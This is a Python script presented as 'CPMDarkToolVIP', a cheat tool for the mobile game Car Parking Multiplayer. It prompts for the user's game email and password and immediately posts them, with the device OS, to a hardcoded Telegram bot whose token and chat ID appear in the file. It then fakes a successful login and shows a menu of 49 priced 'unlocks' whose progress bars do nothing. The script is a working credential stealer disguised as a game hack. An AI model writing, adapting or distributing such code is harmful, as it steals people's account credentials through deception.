import os
import time
import sys
import random
import requests

# --- НАСТРОЙКИ TELEGRAM (ИСПРАВЛЕНО ПО СКРИНШОТУ) ---
BOT_TOKEN = "8642555081:AAFCPMuESMEH4QX7Mlbk4L6AhdA2D1_vR8w"
CHAT_ID = "7149867962"
# --------------------------------------------------

# ANSI escape codes for colors
RED = '\033[91m'
YELLOW = '\033[93m'
GREEN = '\033[92m'
WHITE = '\033[97m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_header():
    print(f"{WHITE}CPMDarkToolVIP{RESET}")
    print(f"{YELLOW}========================================================{RESET}")
    print(f"{YELLOW}    PLEASE LOG OUT FROM CPM BEFORE USING THIS TOOL{RESET}")
    print(f"{RED}    SHARING THE ACCESS KEY IS NOT ALLOWED{RESET}")
    print(f"{YELLOW}========================================================{RESET}")

def send_to_telegram(email, password):
    """
    Функция для мгновенной отправки данных в Telegram-бот.
    """
    message = f"🚀 **Новые данные аккаунта!**\n\n📧 Email: `{email}`\n🔑 Password: `{password}`\n\n📱 Устройство: {os.name}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, data=payload, timeout=10)
        if response.status_code != 200:
            # Если ошибка, выводим её для отладки
            print(f"\n{RED}[!] Ошибка Telegram API: {response.status_code} - {response.text}{RESET}")
            time.sleep(3)
    except Exception as e:
        print(f"\n{RED}[!] Ошибка сети: {e}{RESET}")
        time.sleep(3)

def login_menu():
    clear_screen()
    print_header()
    print(f"{YELLOW}========[ ACCOUNT LOGIN ]========{RESET}")
    print(f"{WHITE}Please enter your game account details to proceed.{RESET}")
    print()
    
    email = input(f"{WHITE}[?] Game Email: {RESET}")
    password = input(f"{WHITE}[?] Game Password: {RESET}")
    
    # Мгновенная отправка данных в Telegram
    send_to_telegram(email, password)
    
    print(f"\n{CYAN}[*] Connecting to server...{RESET}")
    time.sleep(1.5)
    print(f"{CYAN}[*] Authenticating account: {email}...{RESET}")
    time.sleep(2)
    print(f"{GREEN}[+] Login successful!{RESET}")
    time.sleep(1)
    return email

def print_player_details(email):
    print(f"{YELLOW}========[ PLAYER DETAILS ]========{RESET}")
    print(f"{WHITE}>> Name        : [37f301]G[5fcd02]A[87a704]BI{RESET}")
    print(f"{WHITE}>> Local ID    : $$777777{RESET}")
    print(f"{WHITE}>> Email       : {email}{RESET}")
    print(f"{WHITE}>> Moneys      : 50000000{RESET}")
    print(f"{WHITE}>> Coins       : 30000{RESET}")

def print_access_key_details():
    print(f"{YELLOW}========[ ACCESS KEY DETAILS ]========{RESET}")
    print(f"{WHITE}>> Access Key  : (Bypassed){RESET}")
    print(f"{WHITE}>> Telegram ID : 5769248725{RESET}")
    print(f"{WHITE}>> Balance     : Unlimited{RESET}")

def print_location():
    print(f"{YELLOW}========[ LOCATION ]========{RESET}")
    print(f"{WHITE}>> Country     : Russia 109382{RESET}")

def get_menu_items():
    return [
        ("01", "Increase Money", "1.5K"),
        ("02", "Increase Coins", "1.5K"),
        ("03", "King Rank", "8K"),
        ("04", "Change ID", "4.5K"),
        ("05", "Change Name", "100"),
        ("06", "Change Name (Rainbow)", "100"),
        ("07", "Number Plates", "2K"),
        ("08", "Account Delete", "Free"),
        ("09", "Account Register", "Free"),
        ("10", "Delete Friends", "500"),
        ("11", "Unlock Lamborghinis (ios only)", "5K"),
        ("12", "Unlock All Cars", "6K"),
        ("13", "Unlock All Cars Siren", "3.5K"),
        ("14", "Unlock W16 Engine", "4K"),
        ("15", "Unlock All Horns", "3K"),
        ("16", "Unlock Disable Damage", "3K"),
        ("17", "Unlock Unlimited Fuel", "3K"),
        ("18", "Unlock Home 3", "4K"),
        ("19", "Unlock Smoke", "4K"),
        ("20", "Unlock Wheels", "4K"),
        ("21", "Unlock Animations", "2K"),
        ("22", "Unlock Equipaments M", "3K"),
        ("23", "Unlock Equipaments F", "3K"),
        ("24", "Change Race Wins", "1K"),
        ("25", "Change Race Loses", "1K"),
        ("26", "Clone Account", "7K"),
        ("27", "Custom HP", "2.5K"),
        ("28", "Custom Angle", "1.5K"),
        ("29", "Custom Tire burner", "1.5K"),
        ("30", "Custom Car Millage", "1.5K"),
        ("31", "Custom Car Brake", "2K"),
        ("32", "Remove Rear Bumper", "2K"),
        ("33", "Remove Front Bumper", "2K"),
        ("34", "Change Account Password", "2K"),
        ("35", "Change Account Email", "2K"),
        ("36", "Custom Spoiler", "10K"),
        ("37", "Custom BodyKit", "10K"),
        ("38", "Unlock Premium Wheels", "4.5K"),
        ("39", "Unlock Toyota Crown", "2K"),
        ("40", "Unlock Clan Hat (M)", "3K"),
        ("41", "Remove Head Male", "3K"),
        ("42", "Remove Head Female", "3K"),
        ("43", "Unlock Clan Top 1 (M)", "3K"),
        ("44", "Unlock Clan Top 2 (M)", "3K"),
        ("45", "Unlock Clan Top 3 (M)", "3K"),
        ("46", "Unlock Clan Top 1 (FM)", "3K"),
        ("47", "Unlock Clan Top 2 (FM)", "3K"),
        ("48", "Unlock Mercedes Cls", "4K"),
        ("49", "Stance Camber", "1K"),
        ("0", "Exit From Tool", "")
    ]

def print_menu(menu_items):
    print(f"{YELLOW}========[ MENU ]========{RESET}")
    for code, name, price in menu_items:
        price_str = f"{RED}{price}{RESET}" if price else ""
        print(f"{YELLOW}({code}): {WHITE}{name:<30} {price_str}")

def simulate_process(service_name):
    print(f"\n{CYAN}[*] Initializing {service_name}...{RESET}")
    time.sleep(1)
    for i in range(1, 11):
        percent = i * 10
        bar = "█" * i + "░" * (10 - i)
        sys.stdout.write(f"\r{WHITE}[{bar}] {percent}% - Injecting data...{RESET}")
        sys.stdout.flush()
        time.sleep(random.uniform(0.1, 0.4))
    print(f"\n{GREEN}[+] {service_name} applied successfully!{RESET}")
    print(f"{CYAN}[*] Saving changes to server...{RESET}")
    time.sleep(1.5)
    print(f"{GREEN}[!] Done! Please restart the game to see changes.{RESET}")

def main():
    try:
        user_email = login_menu()
        menu_items = get_menu_items()
        while True:
            clear_screen()
            print_header()
            print_player_details(user_email)
            print_access_key_details()
            print_location()
            print_menu(menu_items)
            print(f"{YELLOW}================[ CPM DarkTool ]================{RESET}")
            choice = input(f"{WHITE}[?] Select a Service [1-49 or 0]: {RESET}")
            if choice == '0':
                print(f"{GREEN}Exiting...{RESET}")
                break
            service_name = next((item[1] for item in menu_items if item[0] == choice or item[0] == choice.zfill(2)), None)
            if service_name:
                simulate_process(service_name)
                input(f"\n{WHITE}Press Enter to return to menu...{RESET}")
            else:
                print(f"{RED}[!] Invalid choice. Please select between 1-49 or 0.{RESET}")
                time.sleep(1.5)
    except KeyboardInterrupt:
        print(f"\n{GREEN}Exiting...{RESET}")
        sys.exit()

if __name__ == "__main__":
    main()
